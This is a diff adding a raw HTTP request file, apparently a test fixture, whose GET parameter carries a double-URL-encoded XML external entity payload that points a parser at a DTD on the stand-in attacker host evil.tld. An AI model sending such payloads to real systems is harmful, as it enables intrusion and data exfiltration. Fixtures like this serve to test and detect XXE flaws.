@@ -1,0 +1,4 @@
+GET /a?url=%253C%2521DOCTYPE%2Br%2BSYSTEM%2B%2522http%253A%252F%252Fevil.tld%252Fevil.dtd%2522%253E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
